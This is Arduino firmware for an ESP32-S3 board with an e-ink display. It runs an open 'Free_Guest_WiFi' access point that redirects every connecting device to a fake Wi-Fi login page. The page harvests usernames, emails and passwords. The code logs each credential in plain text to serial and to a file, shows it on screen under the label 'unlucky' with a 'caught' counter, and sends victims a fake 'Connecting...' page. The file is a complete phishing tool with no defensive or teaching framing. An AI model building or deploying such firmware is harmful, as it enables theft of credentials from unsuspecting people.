/*
  ESP32-S3 High-Performance Captive Portal Firmware
  --------------------------------------------------
  Target Board: Adafruit ESP32-S3 Qualia RGB666
  Framework:    Arduino IDE
  Dependencies: LittleFS, DNSServer, WebServer, WiFi, esp_sleep,
                GxEPD2 (Waveshare 2.13" 250x122 e-ink)

  E-ink Wiring (SPI):
    VCC  -> 3.3V
    GND  -> GND
    DIN  -> GPIO11  (MOSI)
    CLK  -> GPIO12  (SCK)
    CS   -> GPIO10
    DC   -> GPIO9
    RST  -> GPIO8
    BUSY -> GPIO7
*/

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>
#include "esp_sleep.h"

// ── E-ink Display (GxEPD2) ────────────────────────────────────────────────────
#include <GxEPD2_BW.h>
#include <Fonts/FreeMonoBold9pt7b.h>
#include <Fonts/FreeMono9pt7b.h>

// Pin definitions for Waveshare 2.13" 250x122 (SPI)
#define EINK_CS   10
#define EINK_DC    9
#define EINK_RST   8
#define EINK_BUSY  7

// GxEPD2 display object — GxEPD2_213_B74 covers Waveshare 2.13" v4 (GDEY0213B74)
GxEPD2_BW<GxEPD2_213_B74, GxEPD2_213_B74::HEIGHT> display(
  GxEPD2_213_B74(EINK_CS, EINK_DC, EINK_RST, EINK_BUSY)
);

// Capture counter in RTC memory — survives deep sleep
RTC_DATA_ATTR int captureCount = 0;

// ── Button Pin Definitions (Adafruit ESP32-S3 Qualia RGB666) ──────────────────
#define BTN_ON  0   // "ON"  button — GPIO0 (boot button) — wakes from deep sleep
#define BTN_UP  6   // "UP"  button — GPIO6

// ── Deep Sleep Configuration ──────────────────────────────────────────────────
// Auto-sleep after this many seconds with no captive-portal client activity
#define INACTIVITY_SLEEP_SEC 300  // 5 minutes

unsigned long lastActivityMs = 0;   // tracks last client interaction

// AP Configuration
const char* AP_SSID = "Free_Guest_WiFi";
const char* AP_PASS = NULL; // Open AP

// ── Channel Control ───────────────────────────────────────────────────────────
#define CH_MIN  1
#define CH_MAX  13
RTC_DATA_ATTR int currentChannel = 6;  // default ch6, survives deep sleep

// UP button debounce + edge detection
#define BTN_DEBOUNCE_MS 50
unsigned long lastBtnUpMs = 0;
bool lastBtnUpState = HIGH;  // tracks previous state for falling-edge detection

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

DNSServer dnsServer;
WebServer server(80);

// HTML Fallback String if LittleFS is not flashed
const char INDEX_HTML_FALLBACK[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Wi-Fi Login</title>
<style>
body{font-family:sans-serif;background:#0f172a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.card{background:#1e293b;padding:2rem;border-radius:12px;width:90%;max-width:360px;box-shadow:0 10px 25px rgba(0,0,0,0.5);}
h2{text-align:center;margin-bottom:1rem;}
input,button{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border-radius:6px;border:1px solid #334155;}
input{background:#0f172a;color:#fff;}
button{background:#2563eb;color:#fff;border:none;font-weight:bold;cursor:pointer;}
</style></head>
<body><div class="card"><h2>Wi-Fi Authentication</h2>
<form action="/login" method="POST">
<input type="text" name="identity" placeholder="Username / Email" required><br>
<input type="password" name="passcode" placeholder="Password" required><br>
<button type="submit">Connect</button>
</form></div></body></html>
)rawliteral";

bool isCaptivePortalRequest() {
  String host = server.hostHeader();
  if (host != "192.168.4.1" && host != "") {
    return true;
  }
  return false;
}

void handleRoot() {
  if (isCaptivePortalRequest()) {
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
    return;
  }

  if (LittleFS.exists("/index.html")) {
    File file = LittleFS.open("/index.html", "r");
    server.streamFile(file, "text/html");
    file.close();
  } else {
    server.send(200, "text/html", INDEX_HTML_FALLBACK);
  }
}

void handleLogin() {
  lastActivityMs = millis();  // reset inactivity timer on client interaction

  String identity = server.arg("identity");
  String passcode = server.arg("passcode");

  Serial.println("=========================================");
  Serial.print("[Auth Entry Received] Identity: ");
  Serial.println(identity);
  Serial.print("[Auth Entry Received] Passcode: ");
  Serial.println(passcode);
  Serial.println("=========================================");

  // Append entry to LittleFS log file
  File logFile = LittleFS.open("/captures.log", FILE_APPEND);
  if (logFile) {
    logFile.printf("%s, %s\n", identity.c_str(), passcode.c_str());
    logFile.close();
  }

  // Update e-ink display with latest credential
  captureCount++;
  updateDisplay(identity, passcode);

  String responseHTML = "<html><head><meta http-equiv='refresh' content='3;url=http://192.168.4.1/'></head>"
                         "<body style='background:#0f172a;color:#fff;font-family:sans-serif;text-align:center;padding-top:20%;'>"
                         "<h2>Connecting...</h2><p>Authenticating your device. Please wait.</p></body></html>";
  server.send(200, "text/html", responseHTML);
}

void handleNotFound() {
  if (isCaptivePortalRequest()) {
    server.sendHeader("Location", "http://192.168.4.1/", true);
    server.send(302, "text/plain", "");
  } else {
    handleRoot();
  }
}

// ── E-ink: Render latest credential ──────────────────────────────────────────
void updateDisplay(const String& identity, const String& passcode) {
  display.setRotation(1);  // landscape (250 wide x 122 tall)
  display.setTextColor(GxEPD_BLACK);

  display.setFullWindow();
  display.firstPage();
  do {
    display.fillScreen(GxEPD_WHITE);

    // ── Top banner ────────────────────────────────────────────────────────────
    display.setFont(&FreeMonoBold9pt7b);
    display.setCursor(70, 14);
    display.print("unlucky");
    display.drawLine(0, 18, 250, 18, GxEPD_BLACK);

    // ── Vertical divider (centre split at x=122) ──────────────────────────────
    display.drawLine(122, 18, 122, 122, GxEPD_BLACK);

    // ── LEFT: AP info ─────────────────────────────────────────────────────────
    display.setFont(&FreeMono9pt7b);

    display.setCursor(4, 34);
    display.print("SSID:");
    // wrap SSID across two lines if needed (max ~11 chars/line at this font)
    String ssid = String(AP_SSID);
    display.setCursor(4, 50);
    display.print(ssid.substring(0, 11));
    if (ssid.length() > 11) {
      display.setCursor(4, 65);
      display.print(ssid.substring(11, 22));
    }

    display.setCursor(4, 83);
    display.print("CH:");
    display.setFont(&FreeMonoBold9pt7b);
    display.setCursor(4, 100);
    display.print(currentChannel);

    display.setFont(&FreeMono9pt7b);
    display.setCursor(4, 116);
    display.print("#");
    display.print(captureCount);
    display.print(" caught");

    // ── RIGHT: Latest credential ──────────────────────────────────────────────
    display.setFont(&FreeMono9pt7b);

    display.setCursor(128, 34);
    display.print("USER:");
    String id = identity.substring(0, min((int)identity.length(), 10));
    display.setCursor(128, 50);
    display.print(id);
    if (identity.length() > 10) {
      display.setCursor(128, 65);
      display.print(identity.substring(10, 20));
    }

    display.setCursor(128, 83);
    display.print("PASS:");
    String pass = passcode.substring(0, min((int)passcode.length(), 10));
    display.setCursor(128, 99);
    display.print(pass);
    if (passcode.length() > 10) {
      display.setCursor(128, 114);
      display.print(passcode.substring(10, 20));
    }

  } while (display.nextPage());
}

// ── Channel hop: increment ch, restart AP, refresh display ───────────────────
void changeChannel() {
  currentChannel++;
  if (currentChannel > CH_MAX) currentChannel = CH_MIN;

  Serial.printf("[CH] Switching to channel %d\n", currentChannel);

  // Restart AP on new channel (keep same SSID/pass)
  WiFi.softAPdisconnect(false);
  delay(100);
  WiFi.softAP(AP_SSID, AP_PASS, currentChannel);

  Serial.printf("[CH] AP restarted on channel %d\n", currentChannel);

  // Refresh display with updated channel (blank creds since no new capture)
  updateDisplay("", "");
}


void goToDeepSleep() {
  Serial.println("[SLEEP] Entering deep sleep. Press ON button (GPIO0) to wake.");
  Serial.flush();
  WiFi.mode(WIFI_OFF);

  // Wake on ON button (GPIO0) — active LOW (pressed = 0)
  esp_sleep_enable_ext0_wakeup((gpio_num_t)BTN_ON, 0);

  esp_deep_sleep_start();
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  // ── Button Setup ────────────────────────────────────────────────────────────
  pinMode(BTN_ON, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);

  // ── Print Wakeup Reason ─────────────────────────────────────────────────────
  esp_sleep_wakeup_cause_t wakeup_reason = esp_sleep_get_wakeup_cause();
  if (wakeup_reason == ESP_SLEEP_WAKEUP_EXT0) {
    Serial.println("[WAKE] Woke from deep sleep via ON button (GPIO0).");
  } else {
    Serial.println("[BOOT] Cold boot / reset.");
  }

  lastActivityMs = millis();

  Serial.println("\n--- ESP32-S3 Captive Portal System ---");

  // Initialize LittleFS
  if (!LittleFS.begin(true)) {
    Serial.println("[ERROR] LittleFS Mount Failed");
  } else {
    Serial.println("[OK] LittleFS Mounted Successfully");
  }

  // Configure SoftAP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(AP_SSID, AP_PASS);

  Serial.print("[OK] Access Point Started: ");
  Serial.println(AP_SSID);
  Serial.print("[OK] IP Address: ");
  Serial.println(WiFi.softAPIP());

  // DNS Captive Portal Redirection
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);

  // Web Server Routes
  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);

  // Probe endpoint captures for Android, iOS, Windows
  server.on("/generate_204", handleRoot);
  server.on("/redirect", handleRoot);
  server.on("/hotspot-detect.html", handleRoot);
  server.on("/canonical.html", handleRoot);
  server.on("/connecttest.txt", handleRoot);

  server.onNotFound(handleNotFound);
  server.begin();

  // ── E-ink Init ──────────────────────────────────────────────────────────────
  display.init(115200, true, 2, false);
  display.setRotation(1);

  // Show ready splash
  display.setFullWindow();
  display.firstPage();
  do {
    display.fillScreen(GxEPD_WHITE);
    display.setFont(&FreeMonoBold9pt7b);
    display.setTextColor(GxEPD_BLACK);
    display.setCursor(10, 40);
    display.print("Portal Ready");
    display.setFont(&FreeMono9pt7b);
    display.setCursor(10, 60);
    display.print("SSID: ");
    display.print(AP_SSID);
    display.setCursor(10, 80);
    display.print("Captures: ");
    display.print(captureCount);
  } while (display.nextPage());

  Serial.println("[OK] E-ink Display Initialized");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  // ── UP Button: increment channel (falling-edge only — fires once per press) ──
  bool currentBtnUp = digitalRead(BTN_UP);
  if (currentBtnUp == LOW && lastBtnUpState == HIGH) {
    unsigned long now = millis();
    if (now - lastBtnUpMs > BTN_DEBOUNCE_MS) {
      lastBtnUpMs = now;
      lastActivityMs = now;
      changeChannel();
    }
  }
  lastBtnUpState = currentBtnUp;

  // ── Inactivity Auto-Sleep ────────────────────────────────────────────────────
  if (millis() - lastActivityMs > (INACTIVITY_SLEEP_SEC * 1000UL)) {
    Serial.println("[SLEEP] Inactivity timeout reached.");
    goToDeepSleep();
  }
}
